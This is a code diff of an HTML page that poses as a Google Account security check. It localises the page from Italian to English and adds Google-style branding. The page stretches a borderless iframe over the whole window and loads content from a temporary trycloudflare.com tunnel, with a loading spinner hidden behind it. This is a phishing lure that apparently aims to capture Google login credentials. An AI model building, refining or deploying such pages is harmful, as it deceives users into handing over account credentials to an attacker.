@@ -1,11 +1,11 @@
 <!DOCTYPE html>
-<html lang="it">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Accedi - Account Google</title>
+    <title>Google Account - Security Check</title>
     <style>
-        /* Rende l'Iframe a tutto schermo senza bordi o barre di scorrimento */
+        /* Ensures the Iframe is full-screen without borders or scrollbars */
         body, html { 
             margin: 0; 
             padding: 0; 
@@ -13,10 +13,10 @@
             width: 100%; 
             overflow: hidden; 
             background-color: white; 
-            font-family: sans-serif;
+            font-family: 'Roboto', Arial, sans-serif;
         }
 
-        /* Posiziona l'animazione di caricamento SOTTO l'iframe */
+        /* Positions the loading animation BEHIND the iframe */
         .loader-container {
             display: flex;
             flex-direction: column;
@@ -25,7 +25,7 @@
             height: 100vh;
             position: absolute;
             width: 100%;
-            z-index: 1; /* Sta dietro */
+            z-index: 1; /* Stay behind */
         }
 
         iframe { 
@@ -35,7 +35,7 @@
             width: 100%; 
             height: 100%; 
             border: none; 
-            z-index: 2; /* Sta davanti */
+            z-index: 2; /* Stay in front */
             background-color: transparent;
         }
 
@@ -55,7 +55,7 @@
 
     <div class="loader-container">
         <div class="spinner"></div>
-        <p style="color: #5f6368; margin-top: 15px;">Caricamento in corso...</p>
+        <p style="color: #5f6368; margin-top: 15px;">One moment...</p>
     </div>
 
     <iframe src="https://wednesday-lucy-recording-creek.trycloudflare.com"></iframe>
